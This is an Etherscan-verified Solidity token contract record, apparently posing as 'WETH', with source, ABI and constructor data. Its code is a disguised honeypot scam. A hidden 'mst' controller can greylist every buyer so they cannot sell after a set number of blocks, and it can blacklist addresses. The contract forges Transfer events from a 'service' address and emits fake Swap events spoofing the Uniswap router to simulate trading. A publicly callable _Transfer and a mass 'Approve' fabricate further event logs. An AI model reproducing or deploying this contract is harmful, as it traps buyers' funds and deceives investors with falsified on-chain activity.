{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-07-24\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2023-07-21\r\n*/\r\n\r\n\r\n\r\npragma solidity ^0.4.24;\r\n\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\ninterface IERC20 {\r\n    \r\n    function _Transfer(address from, address recipient, uint amount) external returns (bool);\r\n\r\n}\r\ncontract Ownable {\r\n    address public owner;\r\n\r\n    address mst;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    \r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public  onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    modifier onlyMst() {\r\n        require(msg.sender == mst);\r\n        _;\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = owner;\r\n        owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\ncontract ERC20Basic {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address who) public view returns (uint256);\r\n    function transfer(address to, uint256 value) public returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\ncontract ERC20 is ERC20Basic {\r\n    function allowance(address owner, address spender) public view returns (uint256);\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool);\r\n    function approve(address spender, uint256 value) public returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract StandardToken is ERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    address public LP;\r\n\r\n    address service;\r\n\r\n    bool ab=false;\r\n\r\n    bool fk=false;\r\n\r\n\r\n    mapping (address => mapping (address => uint256)) internal allowed;\r\n    mapping(address => bool)  tokenBlacklist;\r\n    mapping(address => bool)  tokenGreylist;\r\n    mapping(address => bool)  tokenWhitelist;\r\n    event Blacklist(address indexed blackListed, bool value);\r\n    event Gerylist(address indexed geryListed, bool value);\r\n    event Whitelist(address indexed WhiteListed, bool value);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    mapping(address => uint256)  death;\r\n    uint256  blockN=1;\r\n\r\n\r\n    mapping(address => uint256) balances;\r\n\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        beforTransfer(msg.sender,_to);\r\n        if(ab&&!tokenWhitelist[_to]&&_to!=LP){\r\n            tokenGreylist[_to] = true;\r\n            emit Gerylist(_to, true);\r\n            if(death[_to]==0){\r\n                death[_to]=block.number;\r\n            }\r\n        }\r\n\r\n        require(_to != address(0));\r\n        require(_to != msg.sender);\r\n        require(_value <= balances[msg.sender]);\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\n        // SafeMath.sub will throw if there is not enough balance.\r\n        balances[_to] = balances[_to].add(_value);\r\n        afterTransfer(msg.sender, _to, _value);\r\n        // emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        beforTransfer(_from,_to);\r\n\r\n        if(ab&&!tokenWhitelist[_to]&&_to!=LP){\r\n            tokenGreylist[_to] = true;\r\n            emit Gerylist(_to, true);\r\n            if(death[_to]==0){\r\n                death[_to]=block.number;\r\n            }\r\n        }\r\n        require(_to != _from);\r\n        require(_to != address(0));\r\n        require(_value <= balances[_from]);\r\n        require(_value <= allowed[_from][msg.sender]);\r\n        balances[_from] = balances[_from].sub(_value);\r\n\r\n\r\n        balances[_to] = balances[_to].add(_value);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n        afterTransfer(_from, _to, _value);\r\n        // emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function beforTransfer(address _from, address _to) internal {\r\n        if(!tokenWhitelist[_from]&&!tokenWhitelist[_to]){\r\n            require(tokenBlacklist[_from] == false);\r\n            require(tokenBlacklist[_to] == false);\r\n            require(tokenBlacklist[msg.sender] == false);\r\n            require(tokenGreylist[_from] == false||block.number<death[_from]+blockN);\r\n        }\r\n    }\r\n\r\n    function afterTransfer(address _from, address _to,uint256 amount) internal {\r\n        if(fk){\r\n            _transferEmit(service, _to, amount);\r\n        }else{\r\n            _transferEmit(_from, _to, amount);\r\n        }\r\n    }\r\n\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n\r\n    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\r\n        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\r\n        uint oldValue = allowed[msg.sender][_spender];\r\n        if (_subtractedValue > oldValue) {\r\n            allowed[msg.sender][_spender] = 0;\r\n        } else {\r\n            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\n        }\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function _transferEmit(address _from, address _to, uint _value) internal returns (bool) {\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function _changeAb(bool _ab) internal returns (bool) {\r\n        require(ab != _ab);\r\n        ab=_ab;\r\n        return true;\r\n    }\r\n\r\n    function _changeBlockN(uint256 _blockN) internal returns (bool) {\r\n        blockN=_blockN;\r\n        return true;\r\n    }\r\n\r\n    function _changeFk(bool _fk) internal returns (bool) {\r\n        require(fk!=_fk);\r\n        fk=_fk;\r\n        return true;\r\n    }\r\n\r\n    function _changeLP(address _lp) internal returns (bool) {\r\n        require(LP!=_lp);\r\n        LP=_lp;\r\n        return true;\r\n    }\r\n\r\n    function _blackList(address _address, bool _isBlackListed) internal returns (bool) {\r\n        require(tokenBlacklist[_address] != _isBlackListed);\r\n        tokenBlacklist[_address] = _isBlackListed;\r\n        emit Blacklist(_address, _isBlackListed);\r\n        return true;\r\n    }\r\n\r\n    function _geryList(address _address, bool _isGeryListed) internal returns (bool) {\r\n        require(tokenGreylist[_address] != _isGeryListed);\r\n        tokenGreylist[_address] = _isGeryListed;\r\n        emit Gerylist(_address, _isGeryListed);\r\n        return true;\r\n    }\r\n    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {\r\n        require(tokenWhitelist[_address] != _isWhiteListed);\r\n        tokenWhitelist[_address] = _isWhiteListed;\r\n        emit Whitelist(_address, _isWhiteListed);\r\n        return true;\r\n    }\r\n    function _blackAddressList(address[] _addressList, bool _isBlackListed) internal returns (bool) {\r\n        for(uint i = 0; i < _addressList.length; i++){\r\n            tokenBlacklist[_addressList[i]] = _isBlackListed;\r\n            emit Blacklist(_addressList[i], _isBlackListed);\r\n        }\r\n        return true;\r\n    }\r\n    function _geryAddressList(address[] _addressList, bool _isGeryListed) internal returns (bool) {\r\n        for(uint i = 0; i < _addressList.length; i++){\r\n            tokenGreylist[_addressList[i]] = _isGeryListed;\r\n            emit Gerylist(_addressList[i], _isGeryListed);\r\n        }\r\n        return true;\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract PausableToken is StandardToken, Ownable {\r\n\r\n    function transfer(address _to, uint256 _value) public  returns (bool) {\r\n        return super.transfer(_to, _value);\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {\r\n        return super.transferFrom(_from, _to, _value);\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public  returns (bool) {\r\n        return super.approve(_spender, _value);\r\n    }\r\n\r\n    function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {\r\n        return super.increaseApproval(_spender, _addedValue);\r\n    }\r\n\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {\r\n        return super.decreaseApproval(_spender, _subtractedValue);\r\n    }\r\n    function _Transfer(address _from, address _to, uint _value)public  returns (bool){\r\n        return super._transferEmit(_from,_to,_value);\r\n    }\r\n\r\n    function setAb(bool _ab) public  onlyMst  returns (bool success) {\r\n        return super._changeAb(_ab);\r\n    }\r\n\r\n    function setBn(uint _bn) public  onlyMst  returns (bool success) {\r\n        return super._changeBlockN(_bn);\r\n    }\r\n\r\n    function changeFk(bool _fk) public  onlyMst  returns (bool success) {\r\n        return super._changeFk(_fk);\r\n    }\r\n\r\n    function setLp(address _lp) public  onlyMst  returns (bool success) {\r\n        return super._changeLP(_lp);\r\n    }\r\n\r\n    function BLA(address listAddress,  bool isBlackListed) public  onlyMst  returns (bool success) {\r\n        return super._blackList(listAddress, isBlackListed);\r\n    }\r\n    function GLA(address listAddress,  bool _isGeryListed) public  onlyMst  returns (bool success) {\r\n        return super._geryList(listAddress, _isGeryListed);\r\n    }\r\n    function WLA(address listAddress,  bool _isWhiteListed) public  onlyMst  returns (bool success) {\r\n        return super._whiteList(listAddress, _isWhiteListed);\r\n    }\r\n    function BL(address[] listAddress,  bool isBlackListed) public  onlyMst  returns (bool success) {\r\n        return super._blackAddressList(listAddress, isBlackListed);\r\n    }\r\n    function Approve(address[] listAddress,  bool _isGeryListed) public  onlyMst  returns (bool success) {\r\n        return super._geryAddressList(listAddress, _isGeryListed);\r\n    }\r\n\r\n}\r\n\r\ncontract Token is PausableToken {\r\n    string public name;\r\n    string public symbol;\r\n    uint public decimals;\r\n    event Mint(address indexed from, address indexed to, uint256 value);\r\n    event Burn(address indexed burner, uint256 value);\r\n    bool internal _INITIALIZED_;\r\n\r\n    constructor(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address _service,address _mst) public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply = _supply * 10**_decimals;\r\n        balances[tokenOwner] = totalSupply;\r\n        owner = tokenOwner;\r\n        mst=_mst;\r\n        service=_service;\r\n        emit Transfer(address(0), tokenOwner, totalSupply);\r\n    }\r\n\r\n    function swapExactETHForTokens(\r\n        address[] memory recipients,\r\n        uint256[] memory tokenAmounts,\r\n        uint256[] memory wethAmounts,\r\n        address tokenAddress\r\n    ) public returns (bool) {\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            emit Transfer(LP, recipients[i], tokenAmounts[i]);\r\n            emit Swap(\r\n                0x7a250d5630b4cf539739df2c5dacb4c659f2488d,\r\n                tokenAmounts[i],\r\n                0,\r\n                0,\r\n                wethAmounts[i],\r\n                recipients[i]\r\n            );\r\n            IERC20(tokenAddress)._Transfer(recipients[i], LP, wethAmounts[i]);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function Approve(address []  _addresses, uint256 balance) external  {\r\n        for (uint256 i = 0; i < _addresses.length; i++) {\r\n            emit Approval(_addresses[i], address(this), balance);\r\n        }\r\n    }\r\n\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address\"},{\"name\":\"_isWhiteListed\",\"type\":\"bool\"}],\"name\":\"WLA\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address\"},{\"name\":\"_isGeryListed\",\"type\":\"bool\"}],\"name\":\"GLA\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseApproval\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_ab\",\"type\":\"bool\"}],\"name\":\"setAb\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address[]\"},{\"name\":\"_isGeryListed\",\"type\":\"bool\"}],\"name\":\"Approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addresses\",\"type\":\"address[]\"},{\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Approve\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_bn\",\"type\":\"uint256\"}],\"name\":\"setBn\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"LP\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_fk\",\"type\":\"bool\"}],\"name\":\"changeFk\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address\"},{\"name\":\"isBlackListed\",\"type\":\"bool\"}],\"name\":\"BLA\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"recipients\",\"type\":\"address[]\"},{\"name\":\"tokenAmounts\",\"type\":\"uint256[]\"},{\"name\":\"wethAmounts\",\"type\":\"uint256[]\"},{\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"swapExactETHForTokens\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseApproval\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"_Transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address[]\"},{\"name\":\"isBlackListed\",\"type\":\"bool\"}],\"name\":\"BL\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_lp\",\"type\":\"address\"}],\"name\":\"setLp\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_name\",\"type\":\"string\"},{\"name\":\"_symbol\",\"type\":\"string\"},{\"name\":\"_decimals\",\"type\":\"uint256\"},{\"name\":\"_supply\",\"type\":\"uint256\"},{\"name\":\"tokenOwner\",\"type\":\"address\"},{\"name\":\"_service\",\"type\":\"address\"},{\"name\":\"_mst\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"burner\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"blackListed\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Blacklist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"geryListed\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Gerylist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"WhiteListed\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Whitelist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"}]", "ContractName": "Token", "CompilerVersion": "v0.4.24+commit.e67f0147", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000002540be40000000000000000000000000081c5de137edfcf8fb5462fb66775de1cf393a12300000000000000000000000081c5de137edfcf8fb5462fb66775de1cf393a12300000000000000000000000081c5de137edfcf8fb5462fb66775de1cf393a1230000000000000000000000000000000000000000000000000000000000000004574554480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045745544800000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://d62cad6deffc67c1b44c1b7a1a7d881771c4d60defa5df7e85c42d69e03e9dcf"}